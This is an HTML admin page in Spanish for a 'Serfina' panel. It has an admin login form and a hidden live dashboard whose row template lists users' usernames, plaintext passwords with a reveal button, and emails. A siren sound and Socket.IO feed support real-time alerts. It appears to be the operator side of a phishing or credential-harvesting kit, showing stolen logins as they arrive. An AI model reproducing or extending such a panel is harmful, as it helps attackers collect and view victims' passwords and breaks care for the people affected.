<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Serfina Admin</title>
  <link rel="stylesheet" href="/admin/static/admin.css">
</head>
<body>
  <div id="app">
    <header class="topbar">
      <h1>Serfina - Panel</h1>
      <div id="admin-controls">
        <button id="logoutBtn">Salir</button>
      </div>
    </header>

    <main>
      <section id="loginSection" class="card">
        <h2>Login administrador</h2>
        <form id="loginForm">
          <input name="user" id="user" placeholder="Usuario admin" required>
          <input name="pass" id="pass" type="password" placeholder="Contrase√±a" required>
          <button type="submit">Entrar</button>
        </form>
      </section>

      <section id="dashboard" class="hidden">
        <h2>Usuarios en tiempo real</h2>
        <div id="alerts"></div>
        <div id="tablewrap"></div>
      </section>
    </main>

    <template id="row-template">
      <div class="row card">
        <div class="col user">__USUARIO__</div>
        <div class="col pass">__PASS__ <button class="eye">üëÅ</button></div>
        <div class="col email">__EMAIL__</div>
        <div class="col actions">__ACTIONS__</div>
      </div>
    </template>
  </div>

  <audio id="alert-sound" src="/sounds/sirena.wav" preload="auto"></audio>
  <script src="https://cdn.socket.io/4.7.1/socket.io.min.js"></script>
  <script src="/admin/static/admin.js"></script>

  <script>
    const loginForm = document.getElementById('loginForm');
    const loginSection = document.getElementById('loginSection');
    const dashboard = document.getElementById('dashboard');

    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault(); // evita que recargue la p√°gina

      const user = document.getElementById('user').value;
      const pass = document.getElementById('pass').value;

      try {
        const res = await fetch('/admin/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user, pass })
        });

        const data = await res.json();

        if (data.ok) {
          // login correcto
          loginSection.classList.add('hidden');
          dashboard.classList.remove('hidden');
        } else {
          alert('Usuario o contrase√±a incorrectos');
        }
      } catch (err) {
        console.error(err);
        alert('Error al conectar con el servidor');
      }
    });

    // Logout
    const logoutBtn = document.getElementById('logoutBtn');
    logoutBtn.addEventListener('click', async () => {
      await fetch('/admin/logout', { method: 'POST' });
      loginSection.classList.remove('hidden');
      dashboard.classList.add('hidden');
    });
  </script>
</body>
</html>
